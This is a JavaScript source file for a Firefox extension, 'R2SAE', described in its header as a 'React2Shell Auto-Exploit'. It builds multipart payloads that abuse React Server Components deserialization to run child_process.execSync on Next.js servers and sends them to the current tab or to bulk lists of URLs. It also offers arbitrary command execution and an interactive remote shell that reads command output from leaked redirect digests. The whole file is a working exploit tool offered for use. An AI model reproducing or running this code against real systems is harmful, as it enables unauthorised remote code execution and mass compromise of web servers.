/**
 * R2SAE Firefox Extension - Core Logic
 * React2Shell Auto-Exploit for Browser
 */

// ============================================
// State Management
// ============================================
const state = {
    mode: 'scan', // 'scan' | 'exec' | 'bulk' | 'shell'
    shellConnected: false,
    history: [],
    results: [],
    bulkResults: [],
    consoleLogs: [], // Store console logs for per-site persistence
    currentSite: null, // Track current target site
    settings: {
        timeout: 10,
        autoScroll: true
    }
};

// ============================================
// DOM Elements
// ============================================
const elements = {
    // Tabs
    tabs: document.querySelectorAll('.tab'),
    tabContents: document.querySelectorAll('.tab-content'),

    // Inputs
    targetUrls: document.getElementById('targetUrls'),
    targetUrlDisplay: document.getElementById('targetUrlDisplay'),
    execCommand: document.getElementById('execCommand'),
    shellCommand: document.getElementById('shellCommand'),

    // Buttons
    scanBtn: document.getElementById('scanBtn'),
    execBtn: document.getElementById('execBtn'),
    connectBtn: document.getElementById('connectBtn'),
    sendBtn: document.getElementById('sendBtn'),

    // Bulk Scan
    bulkUrls: document.getElementById('bulkUrls'),
    bulkScanBtn: document.getElementById('bulkScanBtn'),
    bulkResults: document.getElementById('bulkResults'),
    clearBulkUrls: document.getElementById('clearBulkUrls'),

    // Shell
    shellStatus: document.getElementById('shellStatus'),
    shellInputGroup: document.getElementById('shellInputGroup'),

    // Console
    console: document.getElementById('console'),
    copyOutputBtn: document.getElementById('copyOutputBtn'),
    clearConsoleBtn: document.getElementById('clearConsoleBtn'),

    // Modals
    settingsModal: document.getElementById('settingsModal'),
    exportModal: document.getElementById('exportModal'),
    settingsBtn: document.getElementById('settingsBtn'),
    exportBtn: document.getElementById('exportBtn'),
    closeSettings: document.getElementById('closeSettings'),
    closeExport: document.getElementById('closeExport'),

    // Settings
    timeoutSetting: document.getElementById('timeoutSetting'),
    autoScrollSetting: document.getElementById('autoScrollSetting'),
    saveSettings: document.getElementById('saveSettings'),
    resetSettings: document.getElementById('resetSettings'),

    // Export
    exportOptions: document.querySelectorAll('.export-option')
};

// ============================================
// Per-Site State Persistence
// ============================================
function getSiteKey(hostname) {
    return `site_${hostname.replace(/[^a-zA-Z0-9]/g, '_')}`;
}

async function saveSiteState() {
    if (!state.currentSite) return;

    const siteData = {
        mode: state.mode,
        execCommand: elements.execCommand?.value || '',
        bulkUrls: elements.bulkUrls?.value || '',
        consoleLogs: state.consoleLogs.slice(-100), // Keep last 100 logs
        timestamp: Date.now()
    };

    try {
        await browser.storage.local.set({ [getSiteKey(state.currentSite)]: siteData });
    } catch (e) {
        console.error('Failed to save site state:', e);
    }
}

async function loadSiteState(hostname) {
    if (!hostname) return;

    state.currentSite = hostname;

    try {
        const key = getSiteKey(hostname);
        const data = await browser.storage.local.get(key);
        const siteData = data[key];

        if (siteData) {
            // Restore mode/tab
            if (siteData.mode) {
                switchTab(siteData.mode);
            }

            // Restore command input
            if (siteData.execCommand && elements.execCommand) {
                elements.execCommand.value = siteData.execCommand;
            }

            // Restore bulk URLs
            if (siteData.bulkUrls && elements.bulkUrls) {
                elements.bulkUrls.value = siteData.bulkUrls;
            }

            // Restore console logs
            if (siteData.consoleLogs && siteData.consoleLogs.length > 0) {
                elements.console.innerHTML = '';
                state.consoleLogs = siteData.consoleLogs;
                siteData.consoleLogs.forEach(logEntry => {
                    const line = document.createElement('div');
                    line.className = `console-line ${logEntry.type}`;
                    line.innerHTML = `<span class="prefix">${logEntry.prefix}</span><span>${logEntry.message}</span>`;
                    elements.console.appendChild(line);
                });
                if (state.settings.autoScroll) {
                    elements.console.scrollTop = elements.console.scrollHeight;
                }
            }
        }
    } catch (e) {
        console.error('Failed to load site state:', e);
    }
}

// ============================================
// Payload Construction (Ported from react2shell-scanner)
// ============================================
const BOUNDARY = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';

function buildRCEPayload(command) {
    // RCE payload matching scanner.py build_rce_payload
    const prefixPayload =
        `var res=process.mainModule.require('child_process').execSync('${escapeCommand(command)}')` +
        `.toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),` +
        `{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`;

    const part0 =
        `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
        `"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"` +
        prefixPayload +
        `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;

    const body =
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${part0}\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;

    return body;
}

function buildScanPayload() {
    // RCE scan payload that executes echo $((41*271)) = 11111
    const cmd = 'echo $((41*271))';
    const prefixPayload =
        `var res=process.mainModule.require('child_process').execSync('${cmd}')` +
        `.toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),` +
        `{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`;

    const part0 =
        `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
        `"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"` +
        prefixPayload +
        `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;

    const body =
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${part0}\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;

    return body;
}

function buildSafePayload() {
    // Safe side-channel payload (no RCE, just checks for vulnerability)
    const body =
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `{}\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `["$1:aa:aa"]\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;

    return body;
}

function escapeCommand(cmd) {
    return cmd.replace(/'/g, "'\\''");
}

// ============================================
// HTTP Request Handling
// ============================================
async function sendExploit(targetUrl, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), state.settings.timeout * 1000);

    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'dontcare',
                'Content-Type': `multipart/form-data; boundary=${BOUNDARY}`
            },
            body: payload,
            redirect: 'manual',
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        // Get response text
        const responseText = await response.text();

        // Small delay to let background script capture headers
        await new Promise(resolve => setTimeout(resolve, 100));

        // Try to get header from background script (bypasses CORS)
        let bgHeader = null;
        try {
            const bgResponse = await browser.runtime.sendMessage({
                type: 'getLastHeader',
                url: targetUrl
            });
            bgHeader = bgResponse?.header || null;
        } catch (e) {
            // Background script not available, continue without
        }

        // Try direct fetch header (might be blocked by CORS)
        const fetchHeader = response.headers.get('X-Action-Redirect') || '';

        // Use whichever header we got
        const redirectHeader = bgHeader || fetchHeader;

        // Check for redirect pattern in header
        const headerMatch = redirectHeader.match(/\/login\?a=([^;]+)/);

        // Also check response body for the redirect pattern
        const bodyMatch = responseText.match(/\/login\?a=([^;"']+)/);

        // Check for 11111 specifically (RCE scan marker)
        const has11111 = responseText.includes('11111') || redirectHeader.includes('11111');

        if (headerMatch) {
            return {
                success: true,
                output: decodeURIComponent(headerMatch[1]),
                status: response.status,
                source: bgHeader ? 'background' : 'fetch'
            };
        }

        if (bodyMatch) {
            return {
                success: true,
                output: decodeURIComponent(bodyMatch[1]),
                status: response.status,
                source: 'body'
            };
        }

        // Check for vulnerability indicators in response
        const hasDigest = responseText.includes('E{"digest"') || responseText.includes('NEXT_REDIRECT');

        return {
            success: false,
            output: null,
            error: `Status ${response.status}`,
            status: response.status,
            hasVulnIndicator: hasDigest || has11111,
            has11111,
            responseText: responseText.substring(0, 1000),
            bgHeader
        };

    } catch (error) {
        clearTimeout(timeoutId);

        if (error.name === 'AbortError') {
            return { success: false, output: null, error: 'Request timed out' };
        }

        return { success: false, output: null, error: error.message };
    }
}

// ============================================
// Scan Functions (via background script)
// ============================================
async function scanHost(url) {
    try {
        const result = await browser.runtime.sendMessage({
            type: 'scan',
            url: url,
            timeout: state.settings.timeout
        });

        return {
            vulnerable: result.vulnerable || false,
            serverDown: result.serverDown || false,
            output: result.output || null,
            error: result.error,
            scanCommand: result.scanCommand,
            status: result.status
        };
    } catch (e) {
        return {
            vulnerable: false,
            serverDown: false,
            output: null,
            error: e.message
        };
    }
}

async function executeCommand(url, command) {
    try {
        const result = await browser.runtime.sendMessage({
            type: 'executeCommand',
            url: url,
            command: command,
            timeout: state.settings.timeout
        });
        return result;
    } catch (e) {
        return {
            success: false,
            output: null,
            error: e.message
        };
    }
}

// ============================================
// Console Logging
// ============================================
function log(message, type = 'info') {
    const prefixes = {
        info: '→',
        success: '✓',
        error: '✗',
        warning: '⚠',
        output: '>',
        command: '$'
    };

    const prefix = prefixes[type] || '→';
    const escapedMessage = escapeHtml(message);

    // Store log entry for persistence
    state.consoleLogs.push({ message: escapedMessage, type, prefix });
    if (state.consoleLogs.length > 100) {
        state.consoleLogs.shift(); // Keep only last 100
    }

    const line = document.createElement('div');
    line.className = `console-line ${type}`;
    line.innerHTML = `<span class="prefix">${prefix}</span><span>${escapedMessage}</span>`;

    elements.console.appendChild(line);

    if (state.settings.autoScroll) {
        elements.console.scrollTop = elements.console.scrollHeight;
    }

    // Debounced save (save after activity settles)
    clearTimeout(state.saveTimeout);
    state.saveTimeout = setTimeout(() => saveSiteState(), 500);
}

function clearConsole() {
    elements.console.innerHTML = '';
    state.consoleLogs = [];
    saveSiteState();
    log('Console cleared', 'info');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============================================
// History Management
// ============================================
function addToHistory(url, vulnerable) {
    if (!state.settings.saveHistory) return;

    // Remove duplicate if exists
    state.history = state.history.filter(h => h.url !== url);

    // Add to beginning
    state.history.unshift({
        url,
        vulnerable,
        timestamp: Date.now()
    });

    // Keep only last 20
    state.history = state.history.slice(0, 20);

    saveHistory();
    renderHistory();
}

function saveHistory() {
    try {
        browser.storage.local.set({ history: state.history });
    } catch (e) {
        localStorage.setItem('r2sae_history', JSON.stringify(state.history));
    }
}

async function loadHistory() {
    try {
        const data = await browser.storage.local.get('history');
        state.history = data.history || [];
    } catch (e) {
        const stored = localStorage.getItem('r2sae_history');
        state.history = stored ? JSON.parse(stored) : [];
    }
    // History removed - no-op
}

function clearHistory() {
    // History removed - no-op
}

function renderHistory() {
    // History removed - no-op
}

// ============================================
// Settings Management
// ============================================
async function loadSettings() {
    try {
        const data = await browser.storage.local.get('settings');
        if (data.settings) {
            state.settings = { ...state.settings, ...data.settings };
        }
    } catch (e) {
        const stored = localStorage.getItem('r2sae_settings');
        if (stored) {
            state.settings = { ...state.settings, ...JSON.parse(stored) };
        }
    }

    // Update UI
    elements.timeoutSetting.value = state.settings.timeout;
    elements.autoScrollSetting.checked = state.settings.autoScroll;
}

function saveSettingsToStorage() {
    state.settings.timeout = parseInt(elements.timeoutSetting.value) || 10;
    state.settings.autoScroll = elements.autoScrollSetting.checked;

    try {
        browser.storage.local.set({ settings: state.settings });
    } catch (e) {
        localStorage.setItem('r2sae_settings', JSON.stringify(state.settings));
    }
}

function resetSettingsToDefault() {
    state.settings = {
        timeout: 10,
        autoScroll: true
    };

    elements.timeoutSetting.value = 10;
    elements.autoScrollSetting.checked = true;
}

// ============================================
// Export Functions
// ============================================
function exportResults(format) {
    if (state.results.length === 0) {
        log('No results to export', 'warning');
        return;
    }

    let content, filename, mimeType;

    switch (format) {
        case 'json':
            content = JSON.stringify({
                timestamp: new Date().toISOString(),
                results: state.results
            }, null, 2);
            filename = 'r2sae_results.json';
            mimeType = 'application/json';
            break;

        case 'csv':
            const headers = ['URL', 'Vulnerable', 'Method', 'Output'];
            const rows = state.results.map(r => [
                r.url,
                r.vulnerable,
                r.method || '',
                (r.output || '').replace(/"/g, '""')
            ]);
            content = [headers, ...rows].map(r => r.map(c => `"${c}"`).join(',')).join('\n');
            filename = 'r2sae_results.csv';
            mimeType = 'text/csv';
            break;

        case 'txt':
        default:
            content = state.results.map(r =>
                `URL: ${r.url}\nVulnerable: ${r.vulnerable}\nMethod: ${r.method || 'N/A'}\nOutput: ${r.output || 'N/A'}\n`
            ).join('\n---\n');
            filename = 'r2sae_results.txt';
            mimeType = 'text/plain';
    }

    // Create and trigger download
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);

    log(`Results exported as ${format.toUpperCase()}`, 'success');
    elements.exportModal.classList.remove('active');
}

function copyOutput() {
    const text = Array.from(elements.console.querySelectorAll('.console-line'))
        .map(line => line.textContent)
        .join('\n');

    navigator.clipboard.writeText(text).then(() => {
        log('Output copied to clipboard', 'success');
    }).catch(() => {
        log('Failed to copy to clipboard', 'error');
    });
}

// ============================================
// URL Validation
// ============================================
function validateUrl(url) {
    try {
        const parsed = new URL(url);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function getTargetUrls() {
    return elements.targetUrls.value
        .split('\n')
        .map(u => u.trim())
        .filter(u => u.length > 0);
}

// ============================================
// Current Tab Detection
// ============================================
async function getCurrentTabUrl() {
    try {
        const tabs = await browser.tabs.query({ active: true, currentWindow: true });
        if (tabs && tabs.length > 0 && tabs[0].url) {
            const url = tabs[0].url;
            // Only use http/https URLs
            if (url.startsWith('http://') || url.startsWith('https://')) {
                return url;
            }
        }
    } catch (e) {
        console.error('Failed to get current tab:', e);
    }
    return null;
}

async function useCurrentTab() {
    const url = await getCurrentTabUrl();
    if (url) {
        elements.targetUrls.value = url;
        log(`Using current tab: ${new URL(url).hostname}`, 'info');
    } else {
        log('Could not detect current tab URL', 'warning');
    }
}

async function autoFillCurrentTab() {
    // Auto-fill current tab URL on popup open
    try {
        const url = await getCurrentTabUrl();
        if (url) {
            const hostname = new URL(url).hostname;
            elements.targetUrls.value = url;
            if (elements.targetUrlDisplay) {
                elements.targetUrlDisplay.textContent = url;
            }

            // Load saved state for this site
            await loadSiteState(hostname);

            // Only log target if we didn't restore logs (avoids duplicate)
            if (state.consoleLogs.length === 0) {
                log(`Target: ${hostname}`, 'info');
            }
        } else {
            if (elements.targetUrlDisplay) {
                elements.targetUrlDisplay.textContent = 'No valid URL detected';
            }
        }
    } catch (e) {
        console.error('autoFillCurrentTab error:', e);
        if (elements.targetUrlDisplay) {
            elements.targetUrlDisplay.textContent = 'Error detecting URL';
        }
    }
}

// ============================================
// Action Handlers
// ============================================
async function handleScan() {
    const urls = getTargetUrls();

    if (urls.length === 0) {
        log('Please enter at least one target URL', 'warning');
        return;
    }

    // Validate URLs
    const invalidUrls = urls.filter(u => !validateUrl(u));
    if (invalidUrls.length > 0) {
        log(`Invalid URL(s): ${invalidUrls.join(', ')}`, 'error');
        return;
    }

    elements.scanBtn.disabled = true;
    elements.scanBtn.innerHTML = '<span class="loading"></span><span>Scanning...</span>';

    state.results = [];

    for (const url of urls) {
        log(`Scanning: ${url}`, 'info');

        try {
            const result = await scanHost(url);

            // Show which command/check was used
            if (result.scanCommand) {
                log(`Check: ${result.scanCommand}`, 'info');
            }

            state.results.push({
                url,
                vulnerable: result.vulnerable,
                serverDown: result.serverDown,
                output: result.output
            });

            if (result.serverDown) {
                log('SERVER DOWN', 'warning');
            } else if (result.vulnerable) {
                log('VULNERABLE', 'error');
                if (result.output) {
                    log(`Output: ${result.output}`, 'output');
                }
            } else {
                log('NOT VULNERABLE', 'success');
            }

            addToHistory(url, result.vulnerable);

        } catch (error) {
            log(`Error scanning ${url}: ${error.message}`, 'error');
            state.results.push({
                url,
                vulnerable: false,
                method: null,
                output: null,
                error: error.message
            });
        }
    }

    // Summary
    const vulnCount = state.results.filter(r => r.vulnerable).length;
    log(`Scan complete: ${vulnCount}/${urls.length} vulnerable`, vulnCount > 0 ? 'success' : 'info');

    elements.scanBtn.disabled = false;
    elements.scanBtn.innerHTML = `
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="11" cy="11" r="8"/>
      <path d="m21 21-4.35-4.35"/>
    </svg>
    <span>Start Scan</span>
  `;
}

async function handleExec() {
    const urls = getTargetUrls();
    const command = elements.execCommand.value.trim();
    const captureOutput = true; // Always capture output

    if (urls.length === 0) {
        log('Please enter at least one target URL', 'warning');
        return;
    }

    if (!command) {
        log('Please enter a command to execute', 'warning');
        return;
    }

    // Validate URLs
    const invalidUrls = urls.filter(u => !validateUrl(u));
    if (invalidUrls.length > 0) {
        log(`Invalid URL(s): ${invalidUrls.join(', ')}`, 'error');
        return;
    }

    elements.execBtn.disabled = true;
    elements.execBtn.innerHTML = '<span class="loading"></span><span>Executing...</span>';

    log(`Command: ${command}`, 'command');
    state.results = [];

    for (const url of urls) {
        log(`Executing on: ${url}`, 'info');

        try {
            const result = await executeCommand(url, command, captureOutput);

            state.results.push({
                url,
                success: result.success,
                output: result.output,
                error: result.error
            });

            if (result.success && result.output) {
                log(result.output, 'output');
            } else if (result.success) {
                log('Command executed', 'success');
            } else {
                log(`${result.error || 'Failed'}`, 'error');
            }

        } catch (error) {
            log(`Error on ${url}: ${error.message}`, 'error');
        }
    }

    elements.execBtn.disabled = false;
    elements.execBtn.innerHTML = `
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <polygon points="5,3 19,12 5,21 5,3"/>
    </svg>
    <span>Execute</span>
  `;
}

async function handleBulkScan() {
    const urlsText = elements.bulkUrls.value.trim();
    if (!urlsText) {
        log('Please enter at least one URL', 'warning');
        return;
    }

    // Parse URLs and auto-add https:// if missing
    const urls = urlsText.split('\n')
        .map(u => u.trim())
        .filter(u => u.length > 0)
        .map(u => {
            if (!u.startsWith('http://') && !u.startsWith('https://')) {
                return 'https://' + u;
            }
            return u;
        })
        .filter(u => validateUrl(u));

    if (urls.length === 0) {
        log('No valid URLs found', 'warning');
        return;
    }

    elements.bulkScanBtn.disabled = true;
    elements.bulkScanBtn.innerHTML = '<span class="loading"></span><span>Scanning...</span>';
    elements.bulkResults.innerHTML = '';
    state.bulkResults = [];

    log(`Bulk scanning ${urls.length} URLs (background)`, 'info');

    // Create pending items
    urls.forEach((url, index) => {
        const hostname = new URL(url).hostname;
        elements.bulkResults.innerHTML += `
            <div class="bulk-result-item pending" data-index="${index}">
                <span class="status-icon pending">•</span>
                <span class="url">${escapeHtml(hostname)}</span>
            </div>
        `;
    });

    // Start bulk scan in background
    await browser.runtime.sendMessage({
        type: 'startBulkScan',
        targets: urls,
        site: state.currentSite
    });

    // Poll for updates
    pollBulkScanStatus();
}

// Poll for bulk scan status from background
async function pollBulkScanStatus() {
    const status = await browser.runtime.sendMessage({ type: 'getBulkScanStatus' });

    // Update UI with results
    status.results.forEach(result => {
        const item = elements.bulkResults.querySelector(`[data-index="${result.index}"]`);
        if (item && !item.classList.contains('processed')) {
            const hostname = new URL(result.url).hostname;
            let statusClass, icon;

            if (result.serverDown) {
                statusClass = 'down';
                icon = '!';
            } else if (result.vulnerable) {
                statusClass = 'vulnerable';
                icon = '!';
            } else {
                statusClass = 'safe';
                icon = '✓';
            }

            item.className = `bulk-result-item ${statusClass} processed`;
            item.innerHTML = `
                <span class="status-icon ${statusClass}">${icon}</span>
                <span class="url">${escapeHtml(hostname)}</span>
            `;

            // Log result
            if (result.serverDown) {
                log(`${hostname}: SERVER DOWN`, 'warning');
            } else if (result.vulnerable) {
                log(`${hostname}: VULNERABLE`, 'error');
            } else {
                log(`${hostname}: Safe`, 'success');
            }

            state.bulkResults.push(result);
        }
    });

    // Continue polling or finish
    if (status.isRunning) {
        setTimeout(pollBulkScanStatus, 500);
    } else {
        // Scan complete
        const vulnCount = status.results.filter(r => r.vulnerable).length;
        log(`Bulk scan complete: ${vulnCount}/${status.total} vulnerable`, vulnCount > 0 ? 'warning' : 'success');

        elements.bulkScanBtn.disabled = false;
        elements.bulkScanBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="11" cy="11" r="8" />
                <path d="m21 21-4.35-4.35" />
            </svg>
            <span>Scan All</span>
        `;
    }
}

// Restore bulk scan state on popup open
async function restoreBulkScanState() {
    const status = await browser.runtime.sendMessage({ type: 'getBulkScanStatus' });

    if (status.targets.length === 0) return;

    // If bulk scan was for a different site, clear it
    if (status.site && status.site !== state.currentSite) {
        await browser.runtime.sendMessage({ type: 'clearBulkScan' });
        log('Previous bulk scan cleared (different site)', 'info');
        return;
    }

    // Restore UI
    elements.bulkResults.innerHTML = '';
    status.targets.forEach((url, index) => {
        const hostname = new URL(url).hostname;
        const result = status.results.find(r => r.index === index);

        let statusClass = 'pending', icon = '•';
        if (result) {
            if (result.serverDown) {
                statusClass = 'down';
                icon = '!';
            } else if (result.vulnerable) {
                statusClass = 'vulnerable';
                icon = '!';
            } else {
                statusClass = 'safe';
                icon = '✓';
            }
        }

        elements.bulkResults.innerHTML += `
            <div class="bulk-result-item ${statusClass} ${result ? 'processed' : ''}" data-index="${index}">
                <span class="status-icon ${statusClass}">${icon}</span>
                <span class="url">${escapeHtml(hostname)}</span>
            </div>
        `;
    });

    state.bulkResults = status.results;

    // If still running, continue polling
    if (status.isRunning) {
        elements.bulkScanBtn.disabled = true;
        elements.bulkScanBtn.innerHTML = '<span class="loading"></span><span>Scanning...</span>';
        log(`Resuming: ${status.completed}/${status.total} scanned`, 'info');
        pollBulkScanStatus();
    } else if (status.results.length > 0) {
        const vulnCount = status.results.filter(r => r.vulnerable).length;
        log(`Previous scan: ${vulnCount}/${status.total} vulnerable`, 'info');
    }
}


function handleShellConnect() {
    const urls = getTargetUrls();

    if (urls.length === 0) {
        log('Please enter a target URL', 'warning');
        return;
    }

    if (!validateUrl(urls[0])) {
        log('Invalid target URL', 'error');
        return;
    }

    state.shellConnected = true;
    state.shellTarget = urls[0];

    // Update UI
    elements.shellStatus.innerHTML = `
    <span class="status-indicator connected"></span>
    <span>Connected to ${new URL(urls[0]).hostname}</span>
  `;

    elements.connectBtn.style.display = 'none';
    elements.shellInputGroup.style.display = 'block';
    elements.shellCommand.focus();

    log(`Connected to ${urls[0]}`, 'success');
    log('Type commands and press Enter to execute', 'info');
}

function handleShellDisconnect() {
    state.shellConnected = false;
    state.shellTarget = null;

    elements.shellStatus.innerHTML = `
    <span class="status-indicator disconnected"></span>
    <span>Not connected</span>
  `;

    elements.connectBtn.style.display = 'block';
    elements.shellInputGroup.style.display = 'none';

    log('Disconnected', 'info');
}

async function handleShellSend() {
    if (!state.shellConnected) return;

    const command = elements.shellCommand.value.trim();
    if (!command) return;

    if (command.toLowerCase() === 'exit' || command.toLowerCase() === 'quit') {
        handleShellDisconnect();
        return;
    }

    log(command, 'command');
    elements.shellCommand.value = '';
    elements.sendBtn.disabled = true;

    try {
        const result = await executeCommand(state.shellTarget, command, true);

        if (result.success && result.output) {
            log(result.output, 'output');
        } else if (result.success) {
            log('Command executed (no output)', 'info');
        } else {
            log(result.error || 'Command failed', 'error');
        }

    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }

    elements.sendBtn.disabled = false;
    elements.shellCommand.focus();
}

// ============================================
// Tab Switching
// ============================================
function switchTab(tabName) {
    state.mode = tabName;

    // Update tab buttons
    elements.tabs.forEach(tab => {
        tab.classList.toggle('active', tab.dataset.tab === tabName);
    });

    // Update tab content
    document.getElementById('scanContent').classList.toggle('active', tabName === 'scan');
    document.getElementById('execContent').classList.toggle('active', tabName === 'exec');
    document.getElementById('bulkContent').classList.toggle('active', tabName === 'bulk');
    document.getElementById('shellContent').classList.toggle('active', tabName === 'shell');

    // Save state when tab changes
    saveSiteState();
}

// ============================================
// Event Listeners
// ============================================
function initEventListeners() {
    // Tab switching
    elements.tabs.forEach(tab => {
        tab.addEventListener('click', () => switchTab(tab.dataset.tab));
    });

    // Action buttons
    elements.scanBtn.addEventListener('click', handleScan);
    elements.execBtn.addEventListener('click', handleExec);
    elements.bulkScanBtn.addEventListener('click', handleBulkScan);
    elements.connectBtn.addEventListener('click', handleShellConnect);
    elements.sendBtn.addEventListener('click', handleShellSend);

    // Shell command input
    elements.shellCommand.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleShellSend();
    });

    // Execute command input (Enter)
    elements.execCommand.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleExec();
    });

    // Save state on input changes (debounced)
    elements.execCommand.addEventListener('input', () => {
        clearTimeout(state.inputSaveTimeout);
        state.inputSaveTimeout = setTimeout(() => saveSiteState(), 1000);
    });

    elements.bulkUrls.addEventListener('input', () => {
        clearTimeout(state.inputSaveTimeout);
        state.inputSaveTimeout = setTimeout(() => saveSiteState(), 1000);
    });

    // Clear bulk URLs button
    elements.clearBulkUrls.addEventListener('click', async () => {
        elements.bulkUrls.value = '';
        elements.bulkResults.innerHTML = '';
        state.bulkResults = [];
        await browser.runtime.sendMessage({ type: 'clearBulkScan' });
        saveSiteState();
        log('Bulk URLs cleared', 'info');
    });


    elements.clearConsoleBtn.addEventListener('click', clearConsole);
    elements.copyOutputBtn.addEventListener('click', copyOutput);


    // Modals
    elements.settingsBtn.addEventListener('click', () => {
        elements.settingsModal.classList.add('active');
    });

    elements.exportBtn.addEventListener('click', () => {
        elements.exportModal.classList.add('active');
    });

    elements.closeSettings.addEventListener('click', () => {
        elements.settingsModal.classList.remove('active');
    });

    elements.closeExport.addEventListener('click', () => {
        elements.exportModal.classList.remove('active');
    });

    // Close modals on backdrop click
    [elements.settingsModal, elements.exportModal].forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) modal.classList.remove('active');
        });
    });

    // Settings
    elements.saveSettings.addEventListener('click', () => {
        saveSettingsToStorage();
        elements.settingsModal.classList.remove('active');
        log('Settings saved', 'success');
    });

    elements.resetSettings.addEventListener('click', resetSettingsToDefault);

    // Export options
    elements.exportOptions.forEach(option => {
        option.addEventListener('click', () => {
            exportResults(option.dataset.format);
        });
    });

    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Escape to close modals
        if (e.key === 'Escape') {
            elements.settingsModal.classList.remove('active');
            elements.exportModal.classList.remove('active');
        }
    });
}

// ============================================
// Initialization
// ============================================
async function init() {
    await loadSettings();
    await loadHistory();
    initEventListeners();

    // Auto-fill with current tab URL
    await autoFillCurrentTab();

    // Restore any running bulk scan
    await restoreBulkScanState();

    log('R2SAE Browser Extension ready', 'success');
}

// Start when DOM is ready
document.addEventListener('DOMContentLoaded', init);
